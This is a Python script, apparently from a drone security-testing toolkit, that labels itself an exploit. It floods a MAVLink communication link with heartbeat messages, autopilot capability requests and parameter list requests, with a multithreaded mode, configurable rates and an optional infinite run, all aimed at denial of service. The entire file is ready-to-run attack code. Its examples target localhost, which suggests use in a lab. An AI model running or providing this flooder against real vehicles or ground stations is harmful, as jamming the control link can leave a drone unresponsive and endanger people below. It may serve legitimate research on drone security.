#!/usr/bin/env python3
"""
Communication Link Flooding Exploit Script
Floods MAVLink communication channel to cause denial of service
"""

import sys
import time
import threading
from pymavlink import mavutil

def flood_heartbeat(connection, rate=1000, duration=60):
    """
    Flood with heartbeat messages
    
    Args:
        connection: MAVLink connection object
        rate: Messages per second
        duration: Duration in seconds (0 = infinite)
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Flooding with heartbeat messages at {rate} msg/s...")
    if duration > 0:
        print(f"[*] Duration: {duration} seconds")
    else:
        print("[*] Duration: infinite (Press Ctrl+C to stop)")
    
    interval = 1.0 / rate
    start_time = time.time()
    count = 0
    
    try:
        while True:
            connection.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                0, 0, 0
            )
            count += 1
            
            if count % rate == 0:
                elapsed = time.time() - start_time
                print(f"\r[*] Sent {count} messages ({count/elapsed:.0f} msg/s)", end='', flush=True)
            
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[*] Stopping flood...")
    
    elapsed = time.time() - start_time
    print(f"\n[+] Flood complete: {count} messages in {elapsed:.1f}s ({count/elapsed:.0f} msg/s)")

def flood_commands(connection, rate=500, duration=60):
    """
    Flood with command messages
    
    Args:
        connection: MAVLink connection object
        rate: Messages per second
        duration: Duration in seconds (0 = infinite)
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Flooding with command messages at {rate} msg/s...")
    if duration > 0:
        print(f"[*] Duration: {duration} seconds")
    else:
        print("[*] Duration: infinite (Press Ctrl+C to stop)")
    
    interval = 1.0 / rate
    start_time = time.time()
    count = 0
    
    try:
        while True:
            # Send various commands rapidly
            connection.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            count += 1
            
            if count % rate == 0:
                elapsed = time.time() - start_time
                print(f"\r[*] Sent {count} commands ({count/elapsed:.0f} cmd/s)", end='', flush=True)
            
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[*] Stopping flood...")
    
    elapsed = time.time() - start_time
    print(f"\n[+] Flood complete: {count} commands in {elapsed:.1f}s")

def flood_mixed(connection, rate=1000, duration=60, num_threads=3):
    """
    Flood with mixed message types using multiple threads
    
    Args:
        connection: MAVLink connection object
        rate: Total messages per second
        duration: Duration in seconds (0 = infinite)
        num_threads: Number of flooding threads
    """
    print(f"[*] Flooding with mixed messages using {num_threads} threads...")
    print(f"[*] Target rate: {rate} msg/s")
    
    thread_rate = rate // num_threads
    threads = []
    
    def flood_thread(thread_id, msg_type):
        connection_string = connection.connection_string
        # Use helper function for connection
        from pathlib import Path
        import sys
        sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
        from mavlink_helper import connect_to_drone
        conn = connect_to_drone(connection_string, timeout=2)
        if conn is None:
            return
        
        interval = 1.0 / thread_rate
        start_time = time.time()
        count = 0
        
        try:
            while True:
                if msg_type == 'heartbeat':
                    conn.mav.heartbeat_send(
                        mavutil.mavlink.MAV_TYPE_QUADROTOR,
                        mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                        0, 0, 0
                    )
                elif msg_type == 'command':
                    conn.mav.command_long_send(
                        conn.target_system,
                        conn.target_component,
                        mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
                        0, 0, 0, 0, 0, 0, 0, 0
                    )
                elif msg_type == 'request':
                    conn.mav.param_request_list_send(
                        conn.target_system,
                        conn.target_component
                    )
                
                count += 1
                
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                
                time.sleep(interval)
        except:
            pass
    
    # Start threads
    msg_types = ['heartbeat', 'command', 'request']
    for i in range(num_threads):
        thread = threading.Thread(
            target=flood_thread,
            args=(i, msg_types[i % len(msg_types)])
        )
        thread.start()
        threads.append(thread)
    
    # Wait for threads
    for thread in threads:
        thread.join()
    
    print("[+] Mixed flood complete")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 communication_flooding.py <connection> [type] [rate] [duration]")
        print("Example: python3 communication_flooding.py udp:127.0.0.1:14550")
        print("Example: python3 communication_flooding.py udp:127.0.0.1:14550 heartbeat 1000 60")
        print("Example: python3 communication_flooding.py udp:127.0.0.1:14550 mixed 2000 30")
        print("\nTypes: heartbeat, command, mixed")
        print("Rate: Messages per second (default: 1000)")
        print("Duration: Seconds (0 = infinite, default: 60)")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    flood_type = sys.argv[2] if len(sys.argv) > 2 else 'heartbeat'
    
    # Validate rate with limits
    try:
        rate = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 1000
        if rate < 1:
            raise ValueError("Rate must be at least 1 message per second")
        if rate > 10000:
            raise ValueError("Rate cannot exceed 10000 messages per second (system protection)")
    except (ValueError, TypeError) as e:
        print(f"[-] Invalid rate: {e}")
        sys.exit(1)
    
    # Validate duration
    try:
        duration = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].isdigit() else 60
        if duration < 0:
            raise ValueError("Duration cannot be negative")
        if duration > 3600:
            print("[!] Warning: Duration exceeds 1 hour, this may cause system issues")
    except (ValueError, TypeError) as e:
        print(f"[-] Invalid duration: {e}")
        sys.exit(1)
    
    # Validate flood type
    if flood_type not in ['heartbeat', 'command', 'mixed']:
        print(f"[-] Unknown flood type: {flood_type}")
        print("[*] Valid types: heartbeat, command, mixed")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Execute flood
    if flood_type == 'heartbeat':
        flood_heartbeat(connection, rate, duration)
    elif flood_type == 'command':
        flood_commands(connection, rate, duration)
    elif flood_type == 'mixed':
        num_threads = int(sys.argv[5]) if len(sys.argv) > 5 and sys.argv[5].isdigit() else 3
        flood_mixed(connection, rate, duration, num_threads)
    else:
        print(f"[-] Unknown flood type: {flood_type}")
        sys.exit(1)
    
    print("\n[+] Communication flooding attack complete")

if __name__ == "__main__":
    main()
